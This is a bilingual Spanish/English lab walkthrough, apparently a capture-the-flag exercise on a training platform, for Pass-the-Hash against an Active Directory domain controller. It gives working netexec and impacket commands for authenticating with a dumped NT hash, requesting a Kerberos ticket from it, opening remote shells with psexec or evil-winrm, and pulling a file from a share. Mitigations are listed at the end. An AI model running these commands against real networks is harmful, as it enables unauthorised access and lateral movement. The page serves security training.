Objetivo

Con el hash NT de a.miller obtenido en el volcado del NTDS, autentícate en el dominio sin conocer su contraseña en claro y lee //DC01/finance.

Flag: //{{ ad_dc_host }}/finance/flag-ad-11.txt — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Prerequisito: hash NT de a.miller obtenido en el lab AD 10 (DCSync)
nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '<hash_NT_a.miller>' --shares

1 · Por qué funciona

En NTLM, el cliente nunca envía la contraseña: prueba que conoce su hash NT mediante un reto/respuesta. Por tanto el hash NT es la credencial: si lo tienes, puedes autenticarte sin conocer la contraseña en claro. Esto es Pass-the-Hash.

2 · Obtener el hash

El hash de a.miller salió en el volcado NTDS del lab AD 10:

a.miller:1108:aad3b435b51404eeaad3b435b51404ee:<hash_NT_a.miller>:::

# Nos quedamos solo con la parte NT (la que va detrás del segundo ':')
export ADMILLER_NT='<hash_NT_a.miller>'
export DC={{ ad_dc_ip }}

3 · Autenticarse con el hash

# netexec — comprobar acceso y recursos
nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" --shares

# impacket-smbclient
impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC

# Un shell remoto si la cuenta fuese admin local en algún equipo
# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@<host>
# evil-winrm -i <host> -u a.miller -H "$ADMILLER_NT"

4 · Over-Pass-the-Hash (hash → ticket Kerberos)

El hash NT también sirve como clave RC4 para pedir un TGT y moverte por Kerberos (más sigiloso que NTLM):

impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip $DC
export KRB5CCNAME=a.miller.ccache
impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}

5 · Capturar la flag

impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
# use finance
# get flag-ad-11.txt

# o en una línea con netexec
nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" \
  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt

Mitigación

  • Grupo Protected Users y desactivar NTLM donde sea posible (forzar Kerberos + AES).
  • LAPS + evitar reutilización de contraseñas de admin local para frenar el movimiento lateral.
  • Credential Guard y limitar los inicios de sesión interactivos de cuentas privilegiadas.

Herramientas

netexec (nxc) impacket-smbclient impacket-psexec impacket-getTGT evil-winrm mimikatz (sekurlsa::pth)

1 · Why it works

In NTLM the client never sends the password: it proves knowledge of its NT hash through a challenge/response. So the NT hash is the credential: if you have it, you can authenticate without knowing the cleartext. That is Pass-the-Hash.

2 · Get the hash

The a.miller hash came out of the NTDS dump in lab AD 10:

a.miller:1108:aad3b435b51404eeaad3b435b51404ee:<a.miller_NT_hash>:::

# Keep just the NT part (after the second ':')
export ADMILLER_NT='<a.miller_NT_hash>'
export DC={{ ad_dc_ip }}

3 · Authenticate with the hash

# netexec — check access and shares
nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" --shares

# impacket-smbclient
impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC

# A remote shell if the account were a local admin somewhere
# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@<host>
# evil-winrm -i <host> -u a.miller -H "$ADMILLER_NT"

4 · Over-Pass-the-Hash (hash → Kerberos ticket)

The NT hash also works as an RC4 key to request a TGT and move over Kerberos (stealthier than NTLM):

impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip $DC
export KRB5CCNAME=a.miller.ccache
impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}

5 · Capture the flag

impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@$DC
# use finance
# get flag-ad-11.txt

# or as a one-liner with netexec
nxc smb $DC -u 'a.miller' -H "$ADMILLER_NT" \
  --share finance --get-file flag-ad-11.txt ./flag-ad-11.txt && cat flag-ad-11.txt

Mitigation

  • Protected Users group and disabling NTLM where possible (force Kerberos + AES).
  • LAPS + no local-admin password reuse to stop lateral movement.
  • Credential Guard and restricting interactive logons of privileged accounts.
